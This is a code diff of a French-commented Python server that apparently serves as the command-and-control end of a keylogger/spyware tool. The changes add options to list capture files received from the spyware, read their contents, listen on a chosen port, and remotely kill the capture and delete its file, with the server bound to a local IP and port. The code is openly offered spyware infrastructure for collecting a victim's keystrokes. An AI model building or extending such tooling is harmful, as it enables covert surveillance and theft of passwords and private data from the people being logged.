@@ -8,10 +8,21 @@ import socket, ssl, argparse, server_functions
 parser = argparse.ArgumentParser(description="Pour récupérer la capture réalisée par le keylogger exécutez le programme python sans option.")
 # Créer l'option -k pour arrêter la capture et supprimer le fichier
 parser.add_argument("-k", "--kill", help="Pour arrêter la capture et supprimer le fichier, ajoutez l'option -k ou --kill", action="store_true")
-
+# Créer l'option -s pour lister tous les fichiers de captures reçu par le spyware
+parser.add_argument("-s", "--show", help="Pour lister tous les fichiers de captures reçu par le spyware, ajoutez l'option -s ou --show", action="store_true")
+# Créer l'option -l pour écouter sur un port TCP spécifique
+parser.add_argument("-l <port>", "--listen <port>", help="Pour écouter sur un port TCP spécifique, ajoutez l'option -l ou --listen suivi du port TCP", type=int)
+# Créer l'option -r pour afficher le contenu stocké dans un fichier de capture
+parser.add_argument("-r", "--read", help="Pour afficher le contenu stocké dans le fichier de capture, ajoutez l'option -r ou --read", action="store_true")
 #----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 # CODE PRINCIPAL 
 #----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Créer potentiellemnt un dossier pour les résultats
+server_functions.dossier_resultats()
+
+if parser.parse_args().show:
+    server_functions.liste_fichiers()
 
 # Paramètres du serveur
 server_address = ("192.168.1.66", 8080)
@@ -27,10 +38,14 @@ server_socket.listen(1)
 
 print("En attente de connexion...")
 
-if not parser.parse_args().kill:
-    server_functions.transfert(server_socket, 0)
-else:
+if parser.parse_args().kill:
     server_functions.transfert(server_socket, 1)
+else:
+    if parser.parse_args().read:
+        file_name = server_functions.transfert(server_socket, 0)
+        server_functions.read_file(file_name)
+    else:
+        server_functions.transfert(server_socket, 0)
         
 # Fermer le serveur
 server_socket.close()
